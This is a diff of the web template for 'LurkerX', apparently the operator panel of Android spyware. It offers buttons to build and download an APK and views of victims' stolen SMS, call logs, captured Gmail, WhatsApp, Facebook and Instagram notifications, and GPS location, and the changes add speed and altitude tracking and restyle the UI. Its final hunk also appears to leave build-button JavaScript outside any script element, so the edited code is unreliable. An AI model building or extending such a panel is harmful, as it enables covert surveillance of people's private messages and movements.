@@ -6,7 +6,9 @@
   <title>{% block title %}Hacker Panel | LurkerX{% endblock %}</title>
   <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
   <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
-  <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons+Round" />
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Round" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
   <style>
 :root {
   --bg: #0f172a;
@@ -18,6 +20,14 @@
   --accent: #10b981;
   --accent-2: #22d3ee;
   --danger: #ef4444;
+}
+
+.login-error {
+  color: var(--danger);
+  font-size: 0.85rem;
+  margin-top: 12px;
+  min-height: 1.2em;
+  text-align: center;
 }
 
 * {
@@ -422,16 +432,16 @@ body {
       </div>
     </div>
     <div class="sidebar-footer">
-      <button id="build-docker-btn" class="btn btn-primary">
-        <span class="material-icons-round">build</span>
+      <button id="build-docker-btn" class="btn waves-effect waves-light" style="background: var(--accent); color: #000;">
+        <span class="material-icons-round left">build</span>
         Build APK (DOCKER)
       </button>
-      <button id="build-github-btn" class="btn btn-secondary">
-        <span class="material-icons-round">cloud_sync</span>
+      <button id="build-github-btn" class="btn waves-effect waves-light" style="background: transparent; color: var(--accent); border: 1px solid var(--accent);">
+        <span class="material-icons-round left">cloud_sync</span>
         Build APK (GITHUB CI)
       </button>
-      <a id="download-apk-link" class="btn btn-secondary" href="/download_apk">
-        <span class="material-icons-round">download</span>
+      <a id="download-apk-link" class="btn waves-effect waves-light" href="/download_apk" style="background: transparent; color: var(--accent); border: 1px solid var(--accent);">
+        <span class="material-icons-round left">download</span>
         Download App
       </a>
       <div id="build-status" class="build-status"></div>
@@ -441,39 +451,55 @@ body {
   <div class="main">
     {% if unauthorized %}
     <div class="topbar" style="justify-content: center; display: flex;">
-      <div class="login-box">
-        <h1>LurkerX Panel</h1>
-        <p>Enter your token to access the panel.</p>
-        <input id="token-input" type="text" placeholder="Encrypted token" />
-        <button id="token-btn">Get New Token</button>
-        <button id="login-btn">Unlock Panel</button>
-        <p id="login-error" class="login-error"></p>
+      <div class="card" style="max-width: 420px; width: 100%;">
+        <div class="card-content">
+          <div class="center-align" style="margin-bottom: 24px;">
+            <span class="material-icons-round" style="font-size: 48px; color: var(--accent-2); display: block; margin-bottom: 12px;">verified_user</span>
+            <h1 style="margin: 0 0 8px 0; font-size: 1.5rem; color: var(--accent-2);">LurkerX Panel</h1>
+            <p style="color: var(--text-dim); font-size: 0.9rem; margin: 0;">Enter your token to access the panel.</p>
+          </div>
+          <div class="input-field">
+            <input id="token-input" type="text" placeholder="Encrypted token" />
+            <label for="token-input">Encrypted Token</label>
+          </div>
+          <div style="display: flex; gap: 12px; margin-top: 24px;">
+            <button id="login-btn" class="btn waves-effect waves-light" style="flex: 1; background: var(--accent); color: #000;">
+              <span class="material-icons-round left">lock_open</span>
+              Unlock Panel
+            </button>
+            <button id="token-btn" class="btn waves-effect waves-light" style="flex: 1; background: var(--accent-2); color: #000;">
+              <span class="material-icons-round left">vpn_key</span>
+              Get New Token
+            </button>
+          </div>
+          <p id="login-error" class="login-error"></p>
+        </div>
       </div>
     </div>
     {% else %}
     <div class="topbar">
       <h1>Dashboard</h1>
       <div class="control-buttons">
-        <button class="control-btn" onclick="loadType('sms')">
-          <span class="material-icons-round">sms</span>SMS
+        <button class="btn waves-effect waves-light" style="background: transparent; color: var(--text); border: 1px solid var(--border);" onclick="loadType('sms')">
+          <span class="material-icons-round left">sms</span>SMS
         </button>
-        <button class="control-btn" onclick="loadType('calls')">
-          <span class="material-icons-round">call</span>Calls
+        <button class="btn waves-effect waves-light" style="background: transparent; color: var(--text); border: 1px solid var(--border);" onclick="loadType('calls')">
+          <span class="material-icons-round left">call</span>Calls
         </button>
-        <button class="control-btn" onclick="loadType('notifs')">
-          <span class="material-icons-round">notifications</span>Notifications
+        <button class="btn waves-effect waves-light" style="background: transparent; color: var(--text); border: 1px solid var(--border);" onclick="loadType('notifs')">
+          <span class="material-icons-round left">notifications</span>Notifications
         </button>
-        <button class="control-btn" onclick="loadType('gps')">
-          <span class="material-icons-round">location_on</span>GPS
+        <button class="btn waves-effect waves-light" style="background: transparent; color: var(--text); border: 1px solid var(--border);" onclick="loadType('gps')">
+          <span class="material-icons-round left">location_on</span>GPS
         </button>
       </div>
       <div class="filter-buttons">
-        <button class="filter-btn" onclick="filterNotifications('com.google.android.gm')">Gmail</button>
-        <button class="filter-btn" onclick="filterNotifications('com.facebook.katana')">Facebook</button>
-        <button class="filter-btn" onclick="filterNotifications('com.whatsapp')">WhatsApp</button>
-        <button class="filter-btn" onclick="filterNotifications('com.facebook.lite')">Facebook Lite</button>
-        <button class="filter-btn" onclick="filterNotifications('com.instagram.android')">Instagram</button>
-        <button class="filter-btn" onclick="filterNotifications('com.twitter.android')">X</button>
+        <button class="btn waves-effect waves-light" style="background: transparent; color: var(--text); border: 1px solid var(--border); font-size: 0.8rem; padding: 6px 12px;" onclick="filterNotifications('com.google.android.gm')">Gmail</button>
+        <button class="btn waves-effect waves-light" style="background: transparent; color: var(--text); border: 1px solid var(--border); font-size: 0.8rem; padding: 6px 12px;" onclick="filterNotifications('com.facebook.katana')">Facebook</button>
+        <button class="btn waves-effect waves-light" style="background: transparent; color: var(--text); border: 1px solid var(--border); font-size: 0.8rem; padding: 6px 12px;" onclick="filterNotifications('com.whatsapp')">WhatsApp</button>
+        <button class="btn waves-effect waves-light" style="background: transparent; color: var(--text); border: 1px solid var(--border); font-size: 0.8rem; padding: 6px 12px;" onclick="filterNotifications('com.facebook.lite')">Facebook Lite</button>
+        <button class="btn waves-effect waves-light" style="background: transparent; color: var(--text); border: 1px solid var(--border); font-size: 0.8rem; padding: 6px 12px;" onclick="filterNotifications('com.instagram.android')">Instagram</button>
+        <button class="btn waves-effect waves-light" style="background: transparent; color: var(--text); border: 1px solid var(--border); font-size: 0.8rem; padding: 6px 12px;" onclick="filterNotifications('com.twitter.android')">X</button>
       </div>
     </div>
     <div class="board-scroll">
@@ -489,11 +515,24 @@ body {
   </div>
 
   {% if unauthorized %}
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
   <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      M.updateTextFields();
+      var dateEl = document.getElementById('date-select');
+      if (dateEl && M.Datepicker) {
+        M.Datepicker.init(dateEl, { format: 'yyyy-mm-dd', autoClose: true });
+      }
+    });
+
     document.getElementById("login-btn").addEventListener("click", function () {
       const token = document.getElementById("token-input").value.trim();
       const errorEl = document.getElementById("login-error");
       errorEl.style.display = "none";
+      const btn = document.getElementById("login-btn");
+      btn.disabled = true;
+      btn.innerHTML = '<span class="material-icons-round left">hourglass_empty</span>Unlocking...';
+
       fetch("/validate_token", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -503,6 +542,8 @@ body {
         if (res.ok) {
           window.location.reload();
         } else {
+          btn.disabled = false;
+          btn.innerHTML = '<span class="material-icons-round left">lock_open</span>Unlock Panel';
           return res.json().then((data) => { throw new Error(data.error || "Invalid token"); });
         }
       })
@@ -615,23 +656,25 @@ body {
         } else if (type === "calls") {
           rows = [
             { label: "Number", value: item.number || "Unknown" },
-            { label: "Name", value: item.name || "Unknown" },
-            { label: "Duration", value: item.duration + "s" },
-            { label: "Date", value: new Date(item.date).toLocaleString() },
-            { label: "Type", value: item.call_type },
+            { label: "Duration", value: (item.duration || 0) + "s" },
+            { label: "Date", value: new Date(item.timestamp).toLocaleString() },
+            { label: "Type", value: item.call_type || item.type || "Unknown" },
           ];
         } else if (type === "notifs") {
           rows = [
-            { label: "Package", value: item.package },
+            { label: "Package", value: item.package || "Unknown" },
             { label: "Title", value: item.title || "(no title)" },
             { label: "Text", value: item.text || "(empty)" },
+            { label: "Ongoing", value: item.is_ongoing ? "Yes" : "No" },
             { label: "Time", value: new Date(item.timestamp).toLocaleString() },
           ];
         } else if (type === "gps") {
           rows = [
             { label: "Latitude", value: item.latitude },
             { label: "Longitude", value: item.longitude },
-            { label: "Accuracy", value: item.accuracy },
+            { label: "Accuracy", value: item.accuracy ? item.accuracy + "m" : "Unknown" },
+            { label: "Altitude", value: item.altitude ? item.altitude + "m" : "Unknown" },
+            { label: "Speed", value: item.speed ? item.speed + "m/s" : "Unknown" },
             { label: "Time", value: new Date(item.timestamp).toLocaleString() },
           ];
         }
@@ -722,7 +765,13 @@ body {
     renderDevices();
   </script>
   {% if not unauthorized %}
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
   <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      M.updateTextFields();
+    });
+  </script>
+  {% endif %}
     document.getElementById("build-docker-btn").addEventListener("click", function () {
       const btn = document.getElementById("build-docker-btn");
       btn.disabled = true;
